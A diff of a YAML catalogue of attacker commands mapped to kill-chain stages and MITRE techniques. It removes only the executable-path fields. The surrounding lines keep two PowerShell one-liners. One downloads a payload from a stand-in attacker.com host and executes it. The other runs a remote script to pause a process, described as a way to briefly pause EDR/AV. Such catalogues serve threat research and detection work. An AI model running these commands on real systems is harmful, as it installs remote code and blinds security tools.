@@ -1,8 +1,5 @@
 - command: powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://attacker.com/payload.txt')|iex"
   description: Use PowerShell to download and execute a remotely hosted payload.
-  executable:
-    - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-    - C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
   killchain:
     - Installation
   mitre:
@@ -24,9 +21,6 @@
       - N/A
 - command: powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/Pause-Process/master/pause-process.ps1');Pause-Process -ID 1180;UnPause-Process -ID 1180;"
   description: Use PowerShell to pause and unpause a target process - useful in certain evasion/bypass scenarios such as briefly pausing EDR/AV/etc.
-  executable:
-    - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-    - C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
   killchain:
     - Actions on Objectives
     - Installation
